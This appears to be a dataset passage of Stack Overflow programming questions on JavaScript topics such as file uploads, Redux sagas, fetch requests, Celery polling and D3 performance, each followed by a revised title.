see in mynewmenu.js file but that will not solve the non-refreshing elements problem.The menu jsfiddle only, if this helps to have the whole picture, here thanks to @Diego Betto.You can use this live link as example; there is a similar situation with the above described - Ajax implementation right(?) - and regarding the appearance, menu is kept non-refreshed from one page to another; if you browse Books, Works etc, menu sections you'll see; if there is a model that could be implemented here, I'll be glad to find it.LE: meanwhile, I've tried another ajaxify solution made by @arvgta - special thanks - without success yet but as far as I've found from the Author, the defined elements should be div's with id's not classes. So, I'll try to find a way to modify somehow the code in order to have id instead on classes.Also, I'll try to transform and implement in ajaxify.min.js file, the page-container element; jQuery('#page-container').ajaxify(); I'll come back with news.LE2: I've tried to implement the solution using id's instead of classes but still, the pages are not loading correctly. At this point we have ajax.min.js file updated with these lines: Also, I've modified the theme file to have id=page-container instead if class=page-container.In these conditions, on menu click, the links are changed (like it should), menu/ logotext elements seems to working almost fine (sometimes get skippy changing position), but the content is not loading correctly in all cases; Same here, everything is getting back to normal on manual page refresh (f5), but doesn't help. LE3: It looks like the conflict is (at least) between Revolution Slider plugin and Ajaxify. errormessage=""Revolution Slider Error: You have some jquery.js library include that comes after the revolution files js include."" ;="""" +="" This includes make eliminates the revolution slider libraries, and make it not work.""

How to detect jumps for anchors?," I have a one page website, example.com. There are two sections: intro at the top of the page, and contact at the bottom of the page. If I want someone to visit the contact section without having to scroll through the intro, I give them this link: example.com/#contact. I'm talking about these visits below.The browser automatically scrolls down to the contact section, but it ignores the fixed navigation at the top of the page, so the contact section is scrolled behind the navigation so the top of the contact section becomes invisible. This is what I want to correct using JavaScript, by subtracting the height of the fixed navigation from the scroll position. Let's call this function the scrollCorrector. The problem is that I don't know exactly when such an automatic scrolling happens, so the scrollCorrector isn't called everytime it should be.When should the scrollCorrector be called? When the automatic scrolling happens because of the hash portion. Why not to use onscroll? Because this way I can't differenciate an auto scroll from a user scroll. Why not to use onclick on every <a href=""example.com/#contact"">? I'll use it, but what if a user navigates by the browser's back button? Okay, I'll use onpopstate as well. But what if the user comes from example.com/#intro by manually rewriting the URL to example.com/#contact? Okay, I'll use onhashchange as well. But what if the user is already on example.com/#contact, clicks to the address bar, and presses enter without any modification? None of the above helps then.What event should I listen to then? If such an event doesn't exist, how could the scrollCorrector know that an automatic scroll has just happened? <code> ",How to detect automatic scrolling to anchors?

"addEventListener(""loadedmetadata"",fun) doesn't run correctly on firefox"," I wrote a page , and found addEventListener(""loadedmetadata"",fun) doesn't run correctly on firefoxI'm trying fixing a bug of a old software .While loading video and page, the software try to draw some player-controller on the page .It worked well on Chrome and IE , but fail to draw some player-controller on Firefox .I tried debuging days until I found problem can simplify like this : I expected firefox(41.0.1) to alert twice with (""The vid"") and (""Meta data for video loaded"") , but it didn't.These code run correctly on chrome 45 and IE11 .Both of these browers alert twice with (""The vid"") and (""Meta data for video loaded"") as I expected .Is it a bug of firefox ? How can I avoid this problem ?I just tired vid.addEventListener(""canplay"", getmetadata); and got the same result .It seems the problem is about 'addEventListener'The video was loaded . I can use vid.play to play it . I also used console.log(vid) to see if the DOM was right , and it was .It seems addEventListener skip watching ""loadedmetadata"" and ""canplay"" , and I don't know why .I just tried .oncanplay and .onloadedmetadata ,and found it was not the addEventListener ,but the Event caused this problem .While something (e.g. alert()) disturbed the loading , Firefox couldn't get the Event . So if the video came out to be 'On Loadedmetadata' or 'On Canplay' in the moment , firefox didn't catch up it . After that , the video is loadedmetadata or canplay .It's the attributes , not the event .Firefox misses the event , and rushes forward . <code>  <!DOCTYPE html> <html>","addEventListener(""loadedmetadata"",fun) doesn't run correctly ,Firefox misses event"

Can a website detect when you are using selenium with chromedriver?," I've been testing out Selenium with Chromedriver and I noticed that some pages can detect that you're using Selenium even though there's no automation at all. Even when I'm just browsing manually just using Chrome through Selenium and Xephyr I often get a page saying that suspicious activity was detected. I've checked my user agent, and my browser fingerprint, and they are all exactly identical to the normal Chrome browser.When I browse to these sites in normal Chrome everything works fine, but the moment I use Selenium I'm detected.In theory, chromedriver and Chrome should look literally exactly the same to any webserver, but somehow they can detect it.If you want some test code try out this: If you browse around stubhub you'll get redirected and 'blocked' within one or two requests. I've been investigating this and I can't figure out how they can tell that a user is using Selenium.How do they do it?I installed the Selenium IDE plugin in Firefox and I got banned when I went to stubhub.com in the normal Firefox browser with only the additional plugin.When I use Fiddler to view the HTTP requests being sent back and forth I've noticed that the 'fake browser's' requests often have 'no-cache' in the response header.Results like this Is there a way to detect that I'm in a Selenium Webdriver page from JavaScript suggest that there should be no way to detect when you are using a webdriver. But this evidence suggests otherwise.The site uploads a fingerprint to their servers, but I checked and the fingerprint of Selenium is identical to the fingerprint when using Chrome.This is one of the fingerprint payloads that they send to their servers: It's identical in Selenium and in Chrome.VPNs work for a single use, but they get detected after I load the first page.

Celery+Django -- Poll task for state and report success or failure," In my Django project that uses Celery (among a number of other things), I have a Celery task that will upload a file to a database in the background. I use polling to keep track of the upload progress and display a progress bar for uploading. Here are some snippets that detail the upload process:views.py: tasks.py: databaseinserter.py: The uploading code all works well, and the progress bar also works properly. However, I'm not sure how to send a Django message that tells the user that the upload is complete (or, in the event of an error, send a Django message informing the user of the error). When the upload begins, I do this in views.py: And I want to do something like this when an upload is successful: I can't do that in views.py since the Celery task is fire and forget. Is there a way to do this in celery.py? In my DBTask class in celery.py I have on_success and on_failure defined, so would I be able to send Django messages from there? Also, while my polling technically works, it's not currently ideal. The way the polling works currently is that it will endlessly check for a task regardless of whether one is in progress or not. It quickly floods the server console logs and I can imagine has a negative impact on performance overall. I'm pretty new to writing polling code so I'm not entirely sure of best practices and such as well as how to only poll when I need to. What is the best way to deal with the constant polling and the clogging of the server logs? Below is my code for polling.views.py: And the corresponding jQuery code: (These last two snippets come largely from previous StackOverflow questions on Django+Celery progress bars.) <code>  from .tasks import upload_task...upload_task.delay(datapoints, user, description) # datapoints is a list of dictionaries, user and description are simple strings from taskman.celery import app, DBTask # taskman is the name of the Django app that has celery.pyfrom celery import task, current_task@task(base=DBTask)def upload_task(datapoints, user, description): from utils.db.databaseinserter import insertIntoDatabase for count in insertIntoDatabase(datapoints, user, description): percent_completion = int(100 * (float(count) / float(len(datapoints)))) current_task.update_state(state='PROGRESS', meta={'percent':percent_completion}) def insertIntoDatabase(datapoints, user, description): # iterate through the datapoints and upload them one by one # at the end of an iteration, yield the number of datapoints completed so far from django.contrib import messages...messages.info(request, ""Upload is in progress"") messages.info(request, ""Upload successful!"") def poll_state(request): data = 'Failure' if request.is_ajax(): if 'task_id' in request.POST.keys() and request.POST['task_id']: task_id = request.POST['task_id'] task = AsyncResult(task_id) data = task.result or task.state if data == 'SUCCESS' or data == 'FAILURE': # not sure what to do here; what I want is to exit the function early if the current task is already completed return HttpResponse({}, content_type='application/json') else: data ='No task_id in the request' logger.info('No task_id in the request') else: data = 'Not an ajax request' logger.info('Not an ajax request') json_data = json.dumps(data) return HttpResponse(json_data, content_type='application/json') {% if task_id %} jQuery(document).ready(function() { var PollState = function(task_id) { jQuery.ajax({ url: ""poll_state"", type: ""POST"", data: ""task_id="" + task_id, }).done(function(task) { if (task.percent) { jQuery('.bar').css({'width': task.percent + '%'}); jQuery('.bar').html(task.percent + '%'); } else { jQuery('.status').html(task); }; PollState(task_id); }); } PollState('{{ task_id }}'); }){% endif %}",Celery+Django -- Poll task for state and report success or failure using Django messages framework

d3 map svg performance," I've been struggling the past few days to optimize performance on a D3 map, especially on mobile. I am using SVG transforms for zooming and panning but made the following observation: the overkill comes from path strokes used to fake spacing between countries.I have uploaded a pair of sample maps for comparison:http://www.nicksotiriadis.gr/d3/d3-map-1.htmlhttp://www.nicksotiriadis.gr/d3/d3-map-2.htmlThe only difference between the two maps is the stroke path along the country paths, and the difference in performance is even noticeable on desktop devices - but more obvious on mobile. Removing the path strokes makes mobile performance a breeze..I tried all kinds of svg stroke shape-rendering options without significant results.Now to the question. Is there any way to remove a thin border from each country to fake the spacing between countries instead of using a stroke?If anyone else has a different suggestion I'd love to hear it!Update: Attaching explanation photo.What I have drawn is this. The red arrow points to the country joints. When adding a stroke in a color same as the background to the country paths (here depicted in dark grey color) it creates the sense that the countries are seprated - however this adds a serious performance hit on mobile devices. What I am looking for is somehow re-shape the countries paths so that their borderlines are where the blue arrow points, but without having a stroke.Update 2: People seem not to be able to understand what I am looking for, so I am updating this in order to make the question even clearer.Let's assume that the original countries paths are shown on the left of this image. What I am looking for is a way that I can somehow 'contract' the paths inwards so that the newly created paths shown in red, leave enough empty space between them that will 'emulate' a stroke between them.Doing this, will leave no use to having an extra layer of strokes, thus gain performance from only using paths instead of paths+strokes.Update 2: Hello again, I seem to have found a half-solution to my problem. I managed to extract the topojson to shapefile, edit the shapefile the way I want (used a program named OpenJump), but the conversion takes away all the topojson properties I need - id, country name, so I can't convert back to the original topojson.Does anyone have any suggestions? <code> ",D3 map SVG performance

Controlling browser.wait() - fluent wait," The Story:In Java selenium language bindings there is a FluentWait class, that allows to tightly control how the expected condition would be checked: Each FluentWait instance defines the maximum amount of time to wait for a condition, as well as the frequency with which to check the condition. Furthermore, the user may configure the wait to ignore specific types of exceptions whilst waiting, such as NoSuchElementExceptions when searching for an element on the page.In other words, it's possible to change the polling interval in which the expected condition check is applied, which is by default 500ms. Plus, it's possible to set exceptions to ignore.It is also possible in Python, there are relevant poll_frequency and ignored_exceptions arguments to WebDriverWait class.The Question:Is it possible to control the poll frequency in which the expected condition is verified when using browser.wait() in Protractor/WebDriverJS?According to the browser.wait() documentation, there are only 3 possible arguments: a function which is an expected condition, a timeout value and an optional timeout error message. I hope there is a different setting or way to change the poll frequency. <code> ",Controlling poll frequency of browser.wait() (Fluent Wait)

Dynamic Edit form for some kind of Russian Dolls probematic with AngularJS," Here is the problem,I actually have to manage objects that can contain other objects defined in db.So, for example, I have 5 kind of boxes. A red box, a green box, a blue box, a yellow box and a black box.Each box can contain one box, that can also contain a box, and so on.What I receive is this kind of object : So this example is : a black box, containing a red box, containing an empty green box. (black -> red -> green -> empty)There are conditions : The black box can only contain blue, green and red,The red box can only contain green and yellow,The yellow box can contain nothing,The other boxes (green & blue) can contain anythingWhat I need to do is some kind of ""box set editor"", I receive a box object, that is complex or not (meaning that it can have only one box level, or several). I have to represent it in a list of select boxes, so, for the example I wrote it will show this : This has to be achieved with AngularJS. The whole example is coming on a table, so the boxes are displayed as a table this way : Notice the ng-click part. The setCurrentBox() function is defined in the controller, and it sets, as $scope.currentBox, the box object received from the ""BoxService"".Click on the row will call the BoxService, retrieve the json object for the selected box (completely! with the contained boxes into it, as written at top of the thread), and assign it to the $scope.currentBox variable.Change a box selection value should ""empty"" the next possible choice (set ""none"" as selected and add the possible choices as options) and, if there are child boxes then just erase them (change black choice to red in my example black->red->green->empty would give red->empty (None -selected- and green and yellow options).In my case, I only have direct access to $scope.currentBox. And the boxes that ""currentBox"" contains are properties. So, somehow I think I should do some kind of if object.box!=null then read box... But I'm a bit lost about it... Well, I don't know if I'm clear enough in my problem definition, here is a short fiddle that should ""show where I want to get"" in this kind of ""Russian Dolls"" problematic...http://jsfiddle.net/z267dquk/2/Update 1 : http://jsfiddle.net/0js7q638/thanks for reading / help Update 2 : Here is an example of what I exactly mean as my question/What I'd like to make/What I miss does not seem to be clear.Concrete example - START SITUATION : Box object : When user selects box 0 in the table he gets this object : This object has to be displayed into editable select boxes as follows : CONCRETE EXAMPLE : USER ACTION 1 :If user sets box 2 as NO CHOICE OR YELLOW (since yellow box cannot contain any box), then the current box object should look like this : And the HTML part should turn like this : CONCRETE EXAMPLE : USER ACTION 1 :If user sets box 1 as BLUE, then the current box object should look like this : And the HTML part should turn like this : Note that I can get the possible choices for a box, or all possible choices for any box from the BoxService. This HAS TO come from BoxService. This data can be huge, it is small in this example, but this can be a long list of objects that can be contained in another one.Hope this example can make my question more clear.Thanks for reading

Simulating the selection of a file with a file dialog using drag and drop," I have successfully managed to upload a file to a Node server using the multer module by selecting the file using the input file dialog and then by submitting the form, but now I would need, instead of submitting the form, to create a FormData object, and send the file using XMLHttpRequest, but it isn't working, the file is always undefined at the server-side (router).The function that does the AJAX request is: Note that fileToUpload is defined and the url is correct, since the correct router method is called. fileToUpload is a File object obtained by dropping a file from the filesystem to a dropzone, and then by accessing the dataTransfer property of the drop event. doJSONRequest is a function that creates a XMLHttpRequest object and sends the file, etc (as explained in the comments). And here's doRequestSetHeaders: and my router to upload files is the as follows My guess is that multer is not understanding that fileToUpload is a file with name track (isn't it?), i.e. the middleware upload.single(""track"") is not working/parsing properly or nothing, or maybe it simply does not work with FormData, in that case it would be a mess. What would be the alternatives by keeping using multer?How can I upload a file using AJAX and multer?Don't hesitate to ask if you need more details. <code>  function uploadFile(fileToUpload, url) { var form_data = new FormData(); form_data.append('track', fileToUpload, fileToUpload.name); // This function simply creates an XMLHttpRequest object // Opens the connection and sends form_data doJSONRequest(""POST"", ""/tracks/upload"", null, form_data, function(d) { console.log(d); })} function doJSONRequest(method, url, headers, data, callback){ //all the arguments are mandatory if(arguments.length != 5) { throw new Error('Illegal argument count'); } doRequestChecks(method, true, data); //create an ajax request var r = new XMLHttpRequest(); //open a connection to the server using method on the url API r.open(method, url, true); //set the headers doRequestSetHeaders(r, method, headers); //wait for the response from the server r.onreadystatechange = function () { //correctly handle the errors based on the HTTP status returned by the called API if (r.readyState != 4 || (r.status != 200 && r.status != 201 && r.status != 204)){ return; } else { if(isJSON(r.responseText)) callback(JSON.parse(r.responseText)); else if (callback !== null) callback(); } }; //set the data var dataToSend = null; if (!(""undefined"" == typeof data) && !(data === null)) dataToSend = JSON.stringify(data); //console.log(dataToSend) //send the request to the server r.send(dataToSend);} function doRequestSetHeaders(r, method, headers){ //set the default JSON header according to the method parameter r.setRequestHeader(""Accept"", ""application/json""); if(method === ""POST"" || method === ""PUT""){ r.setRequestHeader(""Content-Type"", ""application/json""); } //set the additional headers if (!(""undefined"" == typeof headers) && !(headers === null)){ for(header in headers){ //console.log(""Set: "" + header + ': '+ headers[header]); r.setRequestHeader(header, headers[header]); } }} // Code to manage upload of tracksvar multer = require('multer');var uploadFolder = path.resolve(__dirname, ""../../public/tracks_folder"");function validTrackFormat(trackMimeType) { // we could possibly accept other mimetypes... var mimetypes = [""audio/mp3""]; return mimetypes.indexOf(trackMimeType) > -1;}function trackFileFilter(req, file, cb) { cb(null, validTrackFormat(file.mimetype));}var trackStorage = multer.diskStorage({ // used to determine within which folder the uploaded files should be stored. destination: function(req, file, callback) { callback(null, uploadFolder); }, filename: function(req, file, callback) { // req.body.name should contain the name of track callback(null, file.originalname); }});var upload = multer({ storage: trackStorage, fileFilter: trackFileFilter});router.post('/upload', upload.single(""track""), function(req, res) { console.log(""Uploaded file: "", req.file); // Now it gives me undefined using Ajax! res.redirect(""/""); // or /#trackuploader});",Uploading a file with FormData and multer

"scrollable div to stick to bottom, when outer div changes in size"," Here is an example chat app -> The idea here is to have the .messages-container take up as much of the screen as it can. Within .messages-container, .scroll holds the list of messages, and in case there are more messages then the size of the screen, scrolls.Now, consider this case:The user scrolls to the bottom of the conversationThe .text-input, dynamically gets biggerNow, instead of the user staying scrolled to the bottom of the conversation, the text-input increases, and they no longer see the bottom.One way to fix it, if we are using react, calculate the height of text-input, and if anything changes, let .messages-container know But, this causes visible performance issues, and it's sad to be passing messages around like this.Is there a better way? Could I use css in such a way, to express that when .text-input-increases, I want to essentially shift up all of .messages-container <code>  componentDidUpdate() { window.setTimeout(_ => { const newHeight = this.calcHeight(); if (newHeight !== this._oldHeight) { this.props.onResize(); } this._oldHeight = newHeight; });}","Scrollable div to stick to bottom, when outer div changes in size"

Using AWS sdk with web workers," Total noob on ionic/cordova/angular here. Started last week, so I am struggling here. I am trying to upload files from an app (on iOS), which was created using Ionic and Cordova. The files are images and thus are very big. I want to upload these images in a background worker thread. Thus comes the need for web workers.The images have to be uploaded to Amazon S3. I have the following code in my worker javascript file. My main javascript file is all fine, because I tried it out with non-AWS configurations (plain old console.log(""stuff here"")) and it works all well. It starts failing as soon as I try to do anything with the AWS SDK. Also, the aws-sdk.min.js is being imported correctly (atleast Chrome shows no error on the console). <code>  onmessage = function(e) { importScripts(""aws-sdk.min.js""); console.log(""Doing work""); self.AWS.config.region = 'us-east-1'; //Error here. config is not defined :( self.AWS.config.update({accessKeyId: 'XXX', secretAccessKey: 'ABCD'}); //More AWS stuff postMessage(""DONE"");}",Using AWS SDK with web workers

Bootstrap Accordion Form Visibility," I'm using the bootstrap accordion as a unique way of creating a form. Basically the form has 7 parts each in its own accordion panel. Right now I have it just as I want where they are all collapsed and when you open the first accordion there is a button that links to the second accordion. This is exactly how I want it to work. However is there a way to hide the other accordion panels until the ""next"" button has been selected? For example when I load the page I just want them to be able to see "" 1. Select Features "" and when they open that and select their items when they press the next button thats when the second panel becomes visible and opens up. and so on.I'm assuming I can maybe do something where I have them hidden and the button triggers it to be visible? I've been looking for examples of something like this but I can't find anything. I know this site isn't a code writing service so if someone can just point me to the right direction I can do the rest.

Are Javascript Map Objects Indexed to Optimize map.get?," Behind the scenes, in V8, are JavaScript-Map-object's keys indexed in some manner that optimizes the map.get method? Or does map.get() simply just loop through the entire map until it discovers a key match?I'm interested in the efficiency of map.get on larger mappings of 500,000+ key/value pairs. I have this many mappings that I'd like to just cache in RAM, instead of querying a database where the keys are already indexed for fast value-retrieval. It seems to me, that querying RAM instead of a database would be faster if the Map object's keys are somehow indexed behind the scenes.Abstract: <code>  function randomUniqueThing(){ // returns (magically) a unique random: // string, number, function, array or object.}var objMap = new Map();var count = 0;var thing1,thing2;while(count < 500000){ thing1 = randomUniqueThing(); thing2 = randomUniqueThing(); objMap.set(thing1, thing2); count++;}var lastValue = objMap.get(thing1); // Will getting this last // thing's value take longer // than getting other values?",Are JavaScript Map Objects Indexed to Optimize map.get?

Asserting RGB/RGBA color values in Protractor," The Story:In several places in our test codebase we assert different CSS values to be equal to expected values.

This question is about dealing with colors.Here is an example working test that currently passes: It checks that the Download button on the AngularJS website has 0, 116, 204, 1 RGBA value. Now, if the color would change, the test would fail as, for example: The Problems:As you can see, first of all, the expectation itself is not quite readable. Unless we put a comment near it, it is not obvious what color are we expecting to see. Also, the error message is not informative. It is unclear what an actual color is and what color are we expecting to see.The Question:Is it possible to improve the test itself and the error message to be more readable and informative and operate color names instead of color RGB/RGBA values?Desired expectation: Desired error messages: Currently, I'm thinking about making a custom jasmine matcher that would convert the RGB/RGBA value to a custom Color object that would keep the original value as well as determine the closest color. color npm package looks very promising.Would appreciate any hints. <code>  describe(""AngularJS home page"", function () { beforeEach(function () { browser.get(""https://angularjs.org/""); }); it(""should show a blue Download button"", function () { var downloadButton = element(by.partialLinkText(""Download"")); expect(downloadButton.getCssValue(""background-color"")).toEqual(""rgba(0, 116, 204, 1)""); });}); Expected 'rgba(0, 116, 204, 1)' to equal 'rgba(255, 116, 204, 1)'. expect(downloadButton).toHaveBackgroundColor(""midnight blue""); Expect 'blue' to equal 'black'Expect 'dark grey' to equal 'light sea green'",RGB/RGBA color values in Protractor

For example, I would expect to log ""test"", but instead it logs the empty string, because the body is not copied over.Do I need to do something more explicit to copy all of the attributes correctly, or is there a nice shortcut that will do something reasonable for me?I'm using the github/fetch polyfill, but have tested with both the polyfill and the native fetch implementation in the lastest Chrome. <code>  // My function which tries to modify the URL of the requestfunction addLangParameter(request) { const newUrl = request.url + ""?lang="" + lang; return new Request(newUrl, /* not sure what to put here */);}// My fetch wrapperfunction myFetch(input, init) { // Normalize the input into a Request object return Promise.resolve(new Request(input, init)) // Call my modifier function .then(addLangParameter) // Make the actual request .then(request => fetch(request));} function addLangParameter(request) { const newUrl = request.url + ""?lang="" + lang; return new Request(newUrl, request);} const request1 = new Request(""/"", { method: ""POST"", body: ""test"" });const request2 = new Request(""/new"", request1);request2.text().then(body => console.log(body));",How do I copy a Request object with a different URL?

What should go in a redux state tree or not when you work with database or rest api?," I am a bit lost on what to keep in the state tree of Redux.I saw two conflicting statements on what to store in the state tree(s).React doc tell us that only user input should be stored in state trees. The original list of products is passed in as props, so that's not state. The search text and the checkbox seem to be state since they change over time and can't be computed from anything. And finally, the filtered list of products isn't state because it can be computed by combining the original list of products with the search text and value of the checkbox. Redux doc tells us that we often should store UI state and data in the single state tree: For our todo app, we want to store two different things: The currently selected visibility filter; The actual list of todos. Youll often find that you need to store some data, as well as some UI state**, in the state tree. This is fine, but try to keep the data separate from the UI state.So React tells that we should not store data (I am talking about data of the todos) and, for me, Redux tells the opposite.In my understand I would tend on the React side because both React and Redux aims to predict a UI state by storing:all what can't be computed (eg: all human inputs) and are part of the UI:checkbox valueinput valueradio value...All minimal data that could be use to build a query and send it to the API/database that will return the complete user profil, friends lists, whatever...:user Idcreation dates rangeitems Ids...For me that excludes all database/API results because:that stands on data levelcould be computed by sending the right (and computed by pure reducers) query.So what is your opinion here? <code> ",Should data go in a redux state tree?

ES7 async/await implicitly returns promise?," I read that async functions marked by the async keyword implicitly return a promise: but that is not coherent...assuming doSomethingAsync() returns a promise, and the await keyword will return the value from the promise, not the promise itsef, then my getVal function should return that value, not an implicit promise.So what exactly is the case? Do functions marked by the async keyword implicitly return promises or do we control what they return?Perhaps if we don't explicitly return something, then they implicitly return a promise...?To be more clear, there is a difference between the above and In my synopsis the behavior is indeed inconsistent with traditional return statements. It appears that when you explicitly return a non-promise value from an async function, it will force wrap it in a promise.I don't have a big problem with it, but it does defy normal JS. <code>  async function getVal(){ return await doSomethingAync();}var ret = getVal();console.log(ret); function doSomethingAync(charlie) { return new Promise(function (resolve) { setTimeout(function () { resolve(charlie || 'yikes'); }, 100); })}async function getVal(){ var val = await doSomethingAync(); // val is not a promise console.log(val); // logs 'yikes' or whatever return val; // but this returns a promise}var ret = getVal();console.log(ret); //logs a promise",async/await implicitly returns promise?

Responsive circular images when their origin is rectangular," I am currently working on creating a dynamic style sheet for myself that I will use in the future, and therefore I want it to be dynamic and not hard coded.I have an image class: This class works nicely for all square images, but when I try rectangular images, I get an oval.I tried getting around this by using jQuery, wrapping the image in a container, that I made have overflow hidden and set its height and width to be equal to the height of the image. This solved the problem, however now I am facing responsive issues.When I try to scale the window down, the image becomes squished.Now I wonder if there is a solution to solve this problem entirely dynamically, with no hard coding what so ever, making images in landscape as well as portrait round.I really want to avoid having to check the images size on window resize, and then readjusting the containers size - as I am pretty sure this will take a lot of performance.It is also not an option to use background image. <code>  .image-round{ border-radius: 50%;}",Responsive circular images

How to test your saga," I am trying to test every scenarios my saga could follow, but i am not able to make happens the behaviors i want.This is pretty simple, i have a HTTP request (login), and i want to test the success and the failure cases by mocking my API method.But, it looks like the call effect doesn't fire my api function, i don't really get yet how it works, but i guess that the middleware is in charge of invoking the function, and since i don't go though the store on my test, i can't get the result.So my question is, how can you test your saga when you need to dispatch different actions (typically success or failure) next to your async call ?I looked for an example, i found sagas with success and fail but the fail case is never tested, for example in the shopping cart example here SAGA.JS TEST.JS <code>  export function* login(action) { try { const user = yield call(api.login, action); return yield put(actions.loginSuccess(user)); } catch(e) { yield put(actions.loginFail(e)); }}export default function* rootAuthenticationSagas() { yield* takeLatest(LOGIN, login);} describe('login', () => { context('When it fails', () => { before('Stub the api', () => { sinon.stub(api, 'login', () => { // IT NEVER COMES HERE ! return Promise.reject({ error: 'user not found' }); }); }); it('should return a LOGIN_FAIL action', () => { const action = { payload: { name: 'toto', password: '123456' } }; const generator = login(action); // THE CALL YIELD generator.next(); const expectedResult = put({ type: 'LOGIN_FAIL', payload: { error: 'user not found' } }); expect(generator.next().value).to.be.eql(expectedResult); // FAIL BECAUSE I GET A LOGIN_SUCCESS INSTEAD OF A FAIL ONE }); });});",How to test API request failures with Redux Saga?

Progress indicators for fetch?," I'm struggling to find documentation or examples of implementing an upload progress indicator using fetch.This is the only reference I've found so far, which states:Progress events are a high level feature that won't arrive in fetch for now.

And of course, even if Content-Length is there it can be a lie. With streams you can handle these lies however you want.How would I write ""a pass-through stream to monitor the bytes"" sent?

performance and convenience when storing data as object vs array in MongoDb," Should I store objects in an Array or inside an Object with top importance given Write Speed?I'm trying to decide whether data should be stored as an array of objects, or using nested objects inside a mongodb document.In this particular case, I'm keeping track of a set of continually updating files that I add and update and the file name acts as a key and the number of lines processed within the file.the document looks something like this or this I am making an assumption that handling a document, especially when it comes to updates, it is easier to deal with objects, because the location of the object can be determined by the name; unlike an array, where I have to look through each object's value until I find the match.Because the object key will have periods, I will need to convert (or drop) the periods to create a valid key (fi.le.log to filelog or fi-le-log).I'm not worried about the files' possible duplicate names emerging (such as fi.le.log and fi-le.log) so I would prefer to use Objects, because the number of files is relatively small, but the updates are frequent.Or would it be better to handle this data in a separate collection for best write performance... <code>  { t_id:1220, some-other-info: {}, // there's other info here not updated frequently files: { log1-txt: {filename:""log1.txt"",numlines:233,filesize:19928}, log2-txt: {filename:""log2.txt"",numlines:2,filesize:843} }} { t_id:1220, some-other-info: {}, files:[ {filename:""log1.txt"",numlines:233,filesize:19928}, {filename:""log2.txt"",numlines:2,filesize:843} ]} { ""_id"": ObjectId('56d9f1202d777d9806000003'),""t_id"": ""1220"",""filename"": ""log1.txt"",""filesize"": 1843,""numlines"": 554},{ ""_id"": ObjectId('56d9f1392d777d9806000004'),""t_id"": ""1220"",""filename"": ""log2.txt"",""filesize"": 5231,""numlines"": 3027}",storing data as object vs array in MongoDb for write performance

Client-Side compression v/s Server-Side Compression, I am working on something where users can upload pictures(size of image is not limited). Now I have two options either compressing the image using PHP(Server side) or compressing the image on client's machine using JavaScript and then uploading it to the server. I wanted to ask which approach out of the two would be better to implement? Compression on server might lead to heavy load on the server so I thought of client side compression however if I upload an image of bigger size (lets assume 12MB or so) then browser freezes up for a while due to the script.There is as such no code just a theoretical question. Currently I am usingJ-I-C for client side compressionAny other good library for client side image compression? and which approach would be better? Any help would be much appreciated.  <code> ,Client-Side v/s Server-Side image compression

react-redux testing nested containers," Due to the complexity of the application I am working on I have decided on using a nested redux container rather than passing an action as a prop down to the child components. However, this has proved to be problematic for unit testing when rendering the OuterContainer with jsdom in combination with mocha, chai and sinon. Here is a contrived example of the view structure: where OuterContainer & InnerContainer are wrapped with connect. e.g.:export connect(<mapStateToProps>)(<Component>)When running tests the error I am getting is:Invariant Violation: Could not find ""store"" in either the context or props of ""Connect(Component)"". Either wrap the root component in a `<Provider>`, or explicitly pass ""store"" as a prop to ""Connect(Component)"".Is there a way to unwrap or stub the InnerContainer for unit testing without having to use shallow rendering? <code>  <OuterContainer> <div> <InnerContainer /> </div></OuterContainer>",How to test a component with a nested container with React and Redux?

Trying to understand relationship between React and Redux?," I'm currently learning React and I am trying to figure out how to use it with Redux for building a mobile app. I'm kind of confused on how the two are related/usable together. For example, I completed this tutorial in React https://www.raywenderlich.com/99473/introducing-react-native-building-apps-javascript, but now I want to play around with adding some reducers/actions to that app and I am not sure where those would tie in with what I've already done. <code> ",When should I add Redux to a React app?
Uncaught TypeError: Cannot read property 'call' of undefined after webpack rebuild," I have a strange error when trying to require an html file. The code in question is an AngularJs app written in typescript and using webpack.app.directive.ts app.controller.ts app.html app.scss is empty.Now, as it is, comments included, this code builds with no errors in webpack and will deploy using the webpack dev server.While using the webpack dev server, which lets you change code while the server is running and reload it live, I can uncomment any/all of the commented lines and it will work properly. However, if I turn off the dev server and rebuild, it fails giving this error: Uncaught TypeError: Cannot read property 'call' of undefined webpackJsonpCallback @ bootstrap 9163605:21(anonymous function) @ main.bundle.js:1fails at this line in the webpack:boostrap file: This error occurs while trying to uncomment the app.scss line, the controller lines, or the app.html line. This happens only after a rebuild, with any or all of the lines uncommented.I'm using webpack to build, and commonjs for module loading in the tsconfig, and I have the following webpack loaders in the webpack.config for these types of files: I have been using angular js and typescript for a while, but this is the first time starting my own project, and I'm still stumbling my way through webpack.I am very confused as to why this code will work if I insert it while it is running, but then cease to work after rebuilding. I figure it has something to do with my webpack config, but I'm unable to figure it out and I've been stuck on this for a while. Any help would be appreciated.UPDATEI found the cause, but not a solution.

"React / Redux, sending AJAX request without using actions/reducers?"," I have a few ajax requests that are not directly manipulating my apps state.

Why does monomorphic and polymorphic matters in JS?," I've been reading some articles on change detection, and all of them say that monomorphic functions are much faster than polymorphic. For example, here is a quote: (..)The reason for that is, that it has to be written in a dynamic way, so it can check every component no matter what its model structure looks like. VMs dont like this sort of dynamic code, because they cant optimize it. Its considered polymorphic as the shape of the objects isnt always the same. Angular creates change detector classes at runtime for each component, which are monomorphic, because they know exactly what the shape of the components model is. VMs can perfectly optimize this code, which makes it very fast to execute. The good thing is that we dont have to care about that too much, because Angular does it automatically.(..)SourceNow, I was trying to find examples of monomoprhic vs polymorphic, but couldn't find it anywhere. Could anyone care to explain the difference, and why is it faster? <code> ",Why do monomorphic and polymorphic matter in JavaScript?

NodeJS plans to support import/export es6 (es2015) modules," I've been looking all over the Internet without a clear answer for this.Currently Node.js uses only CommonJS syntax to load modules, and if you really want to use the standard ECMAScript 2015 modules syntax, you either have to transpile it beforehand or use an external module loader at runtime.Currently I'm not too positive to use either of those two methods, are the Node.js maintainers even planning to support ECMAScript 2015 modules or not? I haven't found an hint at all about this.At the moment Node.js 6.x claims to support 96% of the ECMAScript 2015 features, but there isn't any reference to modules (Node.js ECMAScript 2015 support link).Do you know if Node.js will support these modules out of the box, in the near future? <code> ",Node.js plans to support import/export ES6 (ECMAScript 2015) modules
